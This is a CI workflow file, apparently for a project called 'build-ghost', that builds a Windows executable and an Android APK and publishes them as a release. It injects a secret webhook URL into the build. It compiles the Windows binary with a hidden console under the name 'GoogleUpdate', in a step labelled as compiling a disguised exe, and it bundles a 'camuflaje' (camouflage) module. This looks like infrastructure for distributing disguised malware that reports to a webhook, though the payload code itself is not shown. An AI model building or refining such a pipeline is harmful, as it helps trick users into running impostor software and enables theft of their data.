name: build-ghost

on:
  push:
    branches: [main]
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: write

concurrency:
  group: build-${{ github.ref }}
  cancel-in-progress: true

jobs:
  # ------------------------- WINDOWS (.exe) -------------------------
  windows:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Inyectar webhook + iconos
        shell: bash
        env:
          WH: ${{ secrets.WEBHOOK_URL }}
        run: |
          pip install pillow
          python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ.get('WH',''))"
          python tools/make_icons.py

      - name: Dependencias
        run: pip install -r requirements.txt pyinstaller

      - name: Compilar .exe disfrazado
        run: >
          pyinstaller --noconfirm --clean --onefile --noconsole
          --name "GoogleUpdate" --icon icon.ico
          --hidden-import _secret --hidden-import camuflaje
          desktop_entry.py

      - uses: actions/upload-artifact@v4
        with:
          name: windows-exe
          path: dist/GoogleUpdate.exe
          if-no-files-found: error

  # -------------------------- ANDROID (.apk) ------------------------
  android:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Dependencias del sistema
        run: |
          sudo apt-get update
          sudo apt-get install -y git zip unzip autoconf libtool pkg-config \
            zlib1g-dev libncurses-dev cmake libffi-dev libssl-dev automake \
            build-essential ccache

      - name: Cache buildozer
        uses: actions/cache@v4
        with:
          path: |
            ~/.buildozer
            ~/.gradle
            .buildozer
          key: buildozer-${{ runner.os }}-${{ hashFiles('buildozer.spec') }}
          restore-keys: buildozer-${{ runner.os }}-

      - name: Instalar buildozer
        run: |
          pip install --upgrade pip
          pip install buildozer "cython==0.29.36"

      - name: Inyectar webhook
        env:
          WH: ${{ secrets.WEBHOOK_URL }}
        run: python -c "import os;open('_secret.py','w').write('WEBHOOK_URL = %r\n' % os.environ.get('WH',''))"

      - name: Compilar APK
        run: yes | buildozer -v android debug

      - uses: actions/upload-artifact@v4
        with:
          name: android-apk
          path: bin/*.apk
          if-no-files-found: error

  # ----------------------------- RELEASE ---------------------------
  release:
    if: startsWith(github.ref, 'refs/tags/')
    needs: [windows, android]
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          path: artifacts
          merge-multiple: true
      - uses: softprops/action-gh-release@v2
        with:
          files: |
            artifacts/*.exe
            artifacts/*.apk
          generate_release_notes: true
